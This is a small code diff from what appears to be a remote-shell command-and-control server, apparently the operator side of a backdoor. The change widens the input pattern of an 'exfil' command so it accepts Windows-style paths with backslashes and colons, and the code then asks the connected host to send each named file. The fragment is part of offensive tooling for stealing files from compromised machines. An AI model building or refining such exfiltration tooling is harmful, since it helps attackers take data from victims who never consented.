@@ -78,7 +78,7 @@ def shell_server(s, PORT):
                     shell_cmd_help(cmds, 4)
             # exfil
             elif base == cmds[5]:
-                if re.search('^exfil ([\w\/.~]+ )+$', inp + ' '):
+                if re.search('^exfil ([\w\/\\.~:]+ )+$', inp + ' '):
                     for file in inp.split()[1:]:
                         resp = shell_exchange(conn, 'exfil ' + file)
                         if 'No such' in resp:
